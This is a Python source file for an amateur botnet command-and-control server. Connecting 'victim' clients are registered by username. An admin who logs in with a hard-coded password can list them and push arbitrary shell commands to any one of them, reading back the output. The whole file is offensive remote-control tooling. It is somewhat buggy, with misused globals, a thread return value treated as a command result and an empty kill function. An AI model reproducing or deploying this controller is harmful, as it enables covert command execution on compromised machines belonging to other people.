import socket, select
import time
import _thread as thread
PASSWORD = "urmom"
auth = False
socks = [] #socks
clients = {} #{'username' : 'sock'}
user = {} #{'sock' : 'username'}
unames = [] #usernames
adminsock = socket.socket()

def send():
    print(unames)
    name = input("Username to command: ")
    while name not in unames:
        name = input("Username to command: ")
    if name in unames:
        command = input("Enter command to send: ")
        while command != "back":
            vicsoc = clients[name]
            vicsoc.settimeout(5)
            vicsoc.send(command.encode())
            try:
                resp = vicsoc.recv(1024)
                print(resp.decode())
            except:
                print("Timeout")
                return
            command = input("Enter command to send: ")
    else:
        return

def kill():
    return




def ver(sock):
    sock.send(b"Enter password: ")
    pword = sock.recv(1024).decode().strip()
    if pword == PASSWORD:
        auth = True
        adminsock = sock
        thread.start_new_thread(commander, (adminsock,))
        #thread.start_new_thread(waiting, ('a',))
    else:
        sock.send(b"Wrong Password")
    return
    


def newcon(soc):
    socks.append(soc)
    username = soc.recv(1024)
    username = username.decode().strip()
    print(username, " new connection")
    if username == "auth":
        ver(soc)
    else:
        
        clients[username] = soc
        user[soc] = username
        unames.append(username)
    return


def check(sock):
    online = '[' + ', '.join(unames) + ']\nThere are ' + str(len(unames)) + ' online clients'
    print(online)
    sock.send(online.encode())


def disconnection(s):
    if s in user:
        temp = user[s]
        unames.remove(temp)
        del user[s]
        del clients[temp]
        socks.remove(s)


def tout(sock, timeout, command):
    command = command.encode()
    sock.send(command)
    ready_sockets, _, _ = select.select([sock], [], [], timeout)
    if ready_sockets:
        # Socket is ready for receiving data
        data = sock.recv(1024)
        if data:
            # Process the received message
            print("Received message:", data.decode())
    else:
        # Timeout occurred, no data received
        return("NOP")



def commander(adminsock):
    vicsoc = socket.socket()
    thread.start_new_thread(check, (adminsock, ))
    while True:
        time.sleep(1)
        adminsock.send(b"\n1) Command\n2) List online clients\n3) Kill\n4) Exit\nChoose Option Number: ")
        option = adminsock.recv(1024).decode().strip()
        if option== "2":
            thread.start_new_thread(check, (adminsock, ))
        elif option == '1':
            adminsock.send(b"Enter username: ")
            user = adminsock.recv(1024).decode().strip()
            if user in unames:
                try:
                    adminsock.send(b"Enter Comamand: ")
                    command = adminsock.recv(1024).decode().strip()

                    print(command)
                    while command != "back":  
                        vicsoc = clients[user]
                        #vicsoc.send(command.encode())
                        res = thread.start_new_thread(tout, (vicsoc, 5, command,))
                        if res == "NOP":
                            adminsock.send(b"Timeout")
                            break
                        else:
                            adminsock.send(res.encode())
                        #resp = vicsoc.recv(1024)
                        #adminsock.send(resp)
                        adminsock.send(b"Enter Comamand: ")
                        command = adminsock.recv(1024).decode().strip()
                except:
                    return
    return






def main():
    # Create a socket for listening

    while True:
        
        read, write, error = select.select(socks, [], [], 0)
        for sock in read:
            if sock == server_socket:
                soc, addr = server_socket.accept()
                #thread = threading.Thread(target=newcon(soc))
                #thread.start
                thread.start_new_thread(newcon, (soc,))
            else:
                try:
                    data = sock.recv(1024)
                    if not data:
                        if sock in user:
                            print(user[sock], 'disconnected')
                            thread.start_new_thread(disconnection, (sock, ))
                except:
                    if sock in user:
                        print(user[sock], 'disconnected')


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(('192.168.1.105', 8080))
server_socket.listen()
socks.append(server_socket)
print("Server listening on port 8080...")


while True:
    main()

